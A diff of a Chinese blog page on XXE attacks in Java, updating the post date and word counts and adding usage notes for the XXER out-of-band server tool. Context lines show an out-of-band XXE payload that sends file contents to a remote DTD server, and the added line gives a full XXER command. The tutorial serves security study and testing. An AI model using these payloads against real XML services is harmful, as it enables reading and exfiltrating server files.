@@ -439,14 +439,14 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-11-08
+                    2024-07-04
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    5.9k
+                    6k
                 </div>
                 
 
@@ -591,7 +591,7 @@
 &lt;comment&gt; &lt;text&gt;&amp;text;&lt;/text&gt;&lt;/comment&gt;</code></pre>
 <p>引用后会先到 <a target="_blank" rel="noopener" href="http://127.0.0.1:8090/note.dtd">http://127.0.0.1:8090/note.dtd</a> 加载note.dtd，在参数实体的理解中已经知道解析的过程了，引用p后定义send、解析data的值，然后引用send，带着text的值发起远程dtd请求，将数据带出：</p>
 <pre><code class="line-numbers language-xml">&lt;!ENTITY % p "&lt;!ENTITY &amp;#x25; send SYSTEM 'http://127.0.0.1:8090/2.dtd?text=%data;'&gt;"&gt; %p;%send;</code></pre>
-<p>发送POC后，成功获取到带外数据：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/034526faa3470a0d2171a588f59cadea.png"><br>上面是利用参数实体获取文件内容后，请求外部实体时将数据参数发送到服务器。但是如果文件内容存在多行时，会出现错误<code>ParseError at xx Message: Illegal character in URL</code>：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/00072e3176412e10667471f6ed1a0c23.png"><br>参考了一些文章<a target="_blank" rel="noopener" href="https://landgrey.me/blog/9/">Java xxe oob 读取多行文件失败的原因</a>，发现是在JDK中做了限制，数据带外在文件中存在一些如<code>%，&amp;</code>等特殊字符时也会抛出异常，一些协议(gopher)也在高版本中无法使用。所以说XXE能否深入利用还得看JDK的版本。在测试该类型XXE时，可以使用服务工具<a target="_blank" rel="noopener" href="https://github.com/TheTwitchy/xxer">XXER</a>，可以开启HTTP和FTP服务获取带外数据：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/2a333431c3588ae423f9988970e2c358.png"></p>
+<p>发送POC后，成功获取到带外数据：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/034526faa3470a0d2171a588f59cadea.png"><br>上面是利用参数实体获取文件内容后，请求外部实体时将数据参数发送到服务器。但是如果文件内容存在多行时，会出现错误<code>ParseError at xx Message: Illegal character in URL</code>：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/00072e3176412e10667471f6ed1a0c23.png"><br>参考了一些文章<a target="_blank" rel="noopener" href="https://landgrey.me/blog/9/">Java xxe oob 读取多行文件失败的原因</a>，发现是在JDK中做了限制，数据带外在文件中存在一些如<code>%，&amp;</code>等特殊字符时也会抛出异常，一些协议(gopher)也在高版本中无法使用。所以说XXE能否深入利用还得看JDK的版本。在测试该类型XXE时，可以使用服务工具<a target="_blank" rel="noopener" href="https://github.com/TheTwitchy/xxer">XXER</a>，可以开启HTTP和FTP服务获取带外数据。工具需要使用python2执行，执行后默认生成并使用当前目录下的<code>ext.dtd</code>文件，可以根据需要使用<code>-d</code>参数指定，常用命令<code>py -2 xxer.py -p 8081 -P 2121 -H 192.168.200.191</code>：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/2a333431c3588ae423f9988970e2c358.png"></p>
 <h4 id="XXE报错注入"><a href="#XXE报错注入" class="headerlink" title="XXE报错注入"></a>XXE报错注入</h4><p>利用XML解析过程中访问不到远程DTD文件返回404造成报错，错误信息中将包含文件内容:</p>
 <pre><code class="line-numbers language-xml">&lt;?xml version="1.0"?&gt;
 &lt;!DOCTYPE r [
@@ -1436,7 +1436,7 @@ org.xml.sax.SAXParseExceptionpublicId</code></pre>
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">49.2k</span>&nbsp;字
+                class="white-color">49.3k</span>&nbsp;字
             
             
             
